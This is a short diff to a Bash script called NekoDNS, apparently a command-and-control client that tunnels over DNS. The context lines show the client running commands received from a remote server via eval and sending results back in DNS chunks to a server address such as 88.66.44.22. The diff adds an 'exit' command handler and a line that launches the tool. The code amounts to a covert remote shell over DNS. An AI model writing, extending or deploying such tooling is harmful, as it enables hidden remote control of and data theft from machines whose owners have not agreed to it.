@@ -443,6 +443,13 @@ EOF
             debug "File reception timed out for '$LOCAL_PATH'."
         fi
 
+      elif [[ "$COMMAND_LOWER" == "exit" ]]; then
+        debug "Received termination command - exiting client"
+        OUTPUT="[+] Client terminating..."
+        send_chunk "e" "" "$DOMAIN_TO_USE" >/dev/null
+        debug "Client exiting.."
+        exit 0 
+
       else
         debug "Executing local shell command: $COMMAND_FINAL"
         OUTPUT="$(eval "$COMMAND_FINAL" 2>&1)"
@@ -508,3 +515,5 @@ EOF
 # Examples
 # NekoDNS -s 88.66.44.22 -d test.com -l 32 -i 300 -random -verbose
 # NekoDNS -s 88.66.44.22 -d test.com -l 32 -i 300 -random -verbose -tcp
+
+NekoDNS $*
